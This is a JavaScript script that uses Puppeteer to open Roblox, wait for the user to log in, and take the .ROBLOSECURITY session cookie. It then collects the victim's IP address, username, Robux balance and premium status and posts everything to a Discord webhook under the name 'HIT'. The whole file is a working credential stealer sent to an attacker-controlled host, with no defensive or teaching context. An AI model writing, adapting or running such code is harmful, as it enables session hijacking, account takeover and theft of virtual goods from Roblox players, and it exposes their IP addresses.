const puppeteer = require('puppeteer');

const WEBHOOK = "";

// Function to get Roblox cookie via Puppeteer
async function getRobloxCookie() {
  const browser = await puppeteer.launch({ headless: false }); // Change to true if desired
  const page = await browser.newPage();
  await page.goto('https://www.roblox.com');

  console.log("🛑 Please log in to Roblox...");
  await page.waitForNavigation({ waitUntil: 'networkidle2' }); // Wait until navigation completes

  const cookies = await page.cookies();
  await browser.close();

  const robloxCookie = cookies.find(c => c.name === '.ROBLOSECURITY');
  if (robloxCookie) {
    return robloxCookie.value;
  } else {
    throw new Error("🛑 Roblox cookie not found. Please log in manually.");
  }
}

async function main() {
  let cookie;
  try {
    cookie = await getRobloxCookie();
  } catch (err) {
    console.error("🚫 Error getting Roblox cookie:", err);
    return;
  }

  // Fetch IP address
  const ipAddr = await fetch("https://api.ipify.org").then(res => res.text()).catch(() => "IP fetch failed");
  
  let statistics = null;
  if (cookie) {
    try {
      const response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
        headers: { Cookie: `.ROBLOSECURITY=${cookie}` },
        redirect: "manual",
      });
      if (response.ok) {
        statistics = await response.json();
      } else {
        console.error(`❌ Error fetching user info: ${response.status} ${response.statusText}`);
      }
    } catch (err) {
      console.error("🌐 Network error fetching user info:", err);
    }
  }

  // Prepare embed with Roblox emojis and user headshot
  const embed = {
    description: `\`\`\`${cookie}\`\`\``,
    color: 0x0099ff,
    author: {
      name: statistics?.UserName + [`${ipAddr}`](`https://ipapi.co/${ipAddr}/json`),
      icon_url: statistics?.ThumbnailUrl  || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
    },
    footer: {
      text: "https://github.com/gxrhiik",
      icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png",
    },
    thumbnail: {
      url: statistics?.ThumbnailUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
    },
    fields: [
      { name: "📝 Username", value: statistics?.UserName || "N/A", inline: true },
      { name: ":white_robux: Robux", value: statistics?.RobuxBalance || "N/A", inline: true },
      { name: ":premium: Premium", value: (statistics?.IsPremium !== undefined) ? String(statistics.IsPremium) : "N/A", inline: true },
    ],
  };

  // Use user's headshot as author icon
  const authorIconUrl = statistics?.ThumbnailUrl || "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png";

  const payload = {
    content: null,
    embeds: [embed],
    username: "HIT",
    avatar_url: "https://cdn.discordapp.com/avatars/1425248210359947368/fea665d6e4892cac13b6c4d397fedf1b.webp?size=60",
  };

  // Send to Discord webhook
  await fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  }).catch(err => console.error("🚫 Failed to send webhook:", err));
}

main();
